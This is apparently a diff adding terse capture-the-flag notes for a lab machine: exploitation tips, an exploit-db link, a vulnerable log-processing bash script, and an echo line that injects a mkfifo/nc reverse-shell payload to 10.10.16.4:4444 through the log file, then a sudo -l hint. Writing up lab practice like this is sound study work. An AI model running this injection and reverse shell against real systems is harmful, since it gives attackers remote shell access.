@@ -1,0 +1,25 @@
+if an exploit has clearly been patched... will be a rabbit hole... try something else
+If something looks strange like msfconsole for android...? worth checkin it out :)
+https://www.exploit-db.com/exploits/49491
+
+if there are other users with stuff in them... worth a look
+If your initial access cannot give you user.txt... confirm must lateral movement before priv esc
+
+
+#!/bin/bash
+
+log=/home/kid/logs/hackers
+
+cd /home/pwn/
+cat $log | cut -d' ' -f3- | sort -u | while read ip; do
+    sh -c "nmap --top-ports 10 -oN recon/${ip}.nmap ${ip} 2>&1 >/dev/null" &
+done
+
+if [[ $(wc -l < $log) -gt 0 ]]; then echo -n > $log; fi
+
+
+
+echo "1 2 ;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.4 4444 >/tmp/f #" >> hackers
+
+
+sudo -l it up and it will be easy from there
